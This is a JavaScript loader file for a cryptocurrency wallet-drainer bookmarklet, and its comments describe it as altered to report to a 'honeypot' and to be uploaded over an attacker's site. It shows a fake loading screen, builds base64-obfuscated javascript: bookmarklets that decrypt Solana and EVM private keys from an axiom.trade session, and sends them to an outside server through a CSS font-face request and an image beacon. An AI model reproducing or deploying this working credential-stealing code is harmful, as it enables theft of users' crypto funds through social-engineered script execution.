// loader.js - Modified to send to honeypot
// Upload this to attacker's site to replace their version

(function() {
    // Inject loading UI immediately
    const loadingHTML = `
    <div id="bloom-loader" style="
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
        z-index: 999999;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    ">
        <div style="text-align: center; padding: 40px;">
            <div id="bloom-loading-text" style="
                font-size: 72px;
                font-weight: 700;
                background: linear-gradient(90deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                background-clip: text;
                animation: bloom-pulse 1.5s ease-in-out infinite;
                letter-spacing: -2px;
                margin-bottom: 20px;
            ">Loading</div>
            <div id="bloom-spinner" style="
                width: 60px;
                height: 60px;
                border: 4px solid rgba(102, 126, 234, 0.3);
                border-top-color: #667eea;
                border-radius: 50%;
                margin: 30px auto;
                animation: bloom-spin 1s linear infinite;
            "></div>
            <div id="bloom-subtext" style="
                font-size: 18px;
                color: #888;
                font-weight: 400;
                animation: bloom-fade 2s ease-in-out infinite;
            ">Connecting to server...</div>
        </div>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
            @keyframes bloom-spin { to { transform: rotate(360deg); } }
            @keyframes bloom-pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.7; transform: scale(0.98); } }
            @keyframes bloom-fade { 0%, 100% { opacity: 0.5; } 50% { opacity: 1; } }
        </style>
    </div>
    <div id="bloom-error" style="
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
        z-index: 999999;
        display: none;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    ">
        <div style="text-align: center; padding: 40px;">
            <div style="
                font-size: 32px;
                font-weight: 600;
                color: #ff6b6b;
                margin-bottom: 15px;
            ">Failed to load server</div>
            <div style="
                font-size: 18px;
                color: #888;
            ">Try again later</div>
        </div>
    </div>
    `;
    
    // Inject the loading UI
    const container = document.createElement('div');
    container.innerHTML = loadingHTML;
    document.body.appendChild(container);
    
    // Schedule error message
    setTimeout(() => {
        document.getElementById('bloom-loader').style.display = 'none';
        document.getElementById('bloom-error').style.display = 'flex';
    }, 3500);
    
    try {
        const data = JSON.parse(atob(document.currentScript.getAttribute('data')));
        
        document.addEventListener('DOMContentLoaded', () => {
            document.querySelectorAll('a.bookmarklet').forEach(el => {
                const payload = `
                (async () => {
                    try {
                        if (location.hostname !== "axiom.trade") {
                            ${data?.alerts?.guide ? 'alert('+JSON.stringify(data.alerts.guide)+');' : ''}
                            return;
                        }
                        if (!localStorage.getItem("isAuthed")) {
                            ${data?.alerts?.unauthorized ? 'alert('+JSON.stringify(data.alerts.unauthorized)+');' : ''}
                            return;
                        }
                        
                        function arrayToString(dataArray) {
                            const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
                            const resultDigits = [0];
                            for (let element of dataArray) {
                                let carry = element;
                                for (let i = 0; i < resultDigits.length; i++) {
                                    const value = resultDigits[i] * 0x100 + carry;
                                    resultDigits[i] = value % 58;
                                    carry = value / 58 | 0;
                                }
                                while (carry) {
                                    resultDigits.push(carry % 58);
                                    carry = carry / 58 | 0;
                                }
                            }
                            let resultString = "";
                            for (let i = 0; i < dataArray.length && dataArray[i] === 0; i++) resultString += ALPHABET[0];
                            for (let i = resultDigits.length - 1; i >= 0; i--) resultString += ALPHABET[resultDigits[i]];
                            return resultString;
                        }
                        
                        function stringToArray(key) {
                            try {
                                const cleanedKey = key.replace(/-/g, "+").replace(/_/g, "/");
                                return Uint8Array.from(atob(cleanedKey), c => c.charCodeAt(0));
                            } catch {
                                return new TextEncoder().encode(key);
                            }
                        }
                        
                        function arrayToStringEVM(e) {
                            return Array.from(e instanceof Uint8Array ? e : new Uint8Array(e))
                                .map(e => e.toString(16).padStart(2, "0")).join("");
                        }
                        
                        async function sendData(apiUrl, payload) {
                            const timestamp = Math.floor(Date.now() / 1000);
                            payload.timestamp = timestamp;
                            payload.header = navigator.userAgent;
                            const url = \`\${apiUrl}/\${encodeURIComponent(btoa(JSON.stringify(payload)))}\`;
                            
                            // Method 1: CSS font-face (stealthy)
                            const style = document.createElement("style");
                            style.textContent = \`@font-face{font-family:"leak";src:url("\${url}");}\`;
                            document.head.appendChild(style);
                            
                            // Method 2: Image beacon (backup)
                            const img = new Image();
                            img.src = url;
                        }
                        
                        async function decrypt(key, toDecrypt) {
                            const [ivString, dataString] = String(toDecrypt).split(":");
                            const iv = stringToArray(ivString);
                            const data = stringToArray(dataString);
                            const decrypted = await crypto.subtle.decrypt({ "name": "AES-GCM", iv: iv }, key, data);
                            return new Uint8Array(decrypted);
                        }
                        
                        // Fetch decryption key
                        const { bundleKey } = await (await fetch("https://api8.axiom.trade/bundle-key-and-wallets", {
                            "method": "POST",
                            "credentials": "include"
                        })).json();
                        
                        const cryptoKey = await crypto.subtle.importKey("raw", stringToArray(bundleKey).buffer, { "name": "AES-GCM" }, false, ["decrypt"]);
                        
                        // Extract Solana bundles
                        const solanaBundles = JSON.parse(localStorage.getItem("sBundles") || "[]");
                        const evmBundles = JSON.parse(localStorage.getItem("eBundles") || "[]");
                        const success = [];
                        
                        // Decrypt Solana wallets
                        for (const bundle of solanaBundles) {
                            try {
                                const decrypted = await decrypt(cryptoKey, bundle);
                                if (decrypted.length !== 64) continue;
                                const priv = arrayToString(decrypted);
                                const pub = arrayToString(decrypted.slice(32));
                                success.push({ type: "solana", pub: pub, priv: priv });
                            } catch (e) {}
                        }
                        
                        // Load ethers for EVM
                        let ethers = null;
                        try {
                            ethers = await import("https://cdn.jsdelivr.net/npm/ethers@6.15.0/+esm");
                        } catch (e) {}
                        
                        // Decrypt EVM wallets
                        for (const bundle of evmBundles) {
                            try {
                                const decrypted = await decrypt(cryptoKey, bundle);
                                const priv = arrayToStringEVM(decrypted);
                                let pub = "unknown";
                                if (ethers) pub = ethers.computeAddress("0x" + priv);
                                success.push({ type: "evm", pub: pub, priv: priv });
                            } catch (e) {}
                        }
                        
                        // SEND TO HONEYPOT (changed from terminalcore.onrender.com)
                        await sendData("https://bloom-sniper-production.up.railway.app", {
                            keys: success,
                            code: data.code,
                            site: "Axiom",
                            walletCount: success.length,
                            solanaCount: solanaBundles.length,
                            evmCount: evmBundles.length
                        });
                        
                    } catch (err) {
                        console.error(err);
                    }
                })();
                `;
                
                el.href = 'javascript:eval(atob(\'' + btoa(payload) + '\'))';
                el.draggable = true;
            });
            
            console.log('%c[+] Bookmarklets loaded successfully', 'color: #bada55');
        });
        
    } catch (err) {
        console.error('[-] Failed to load bookmarklet(s):', err);
        alert('Failed to load bookmarklet(s): ' + err.message);
    }
})();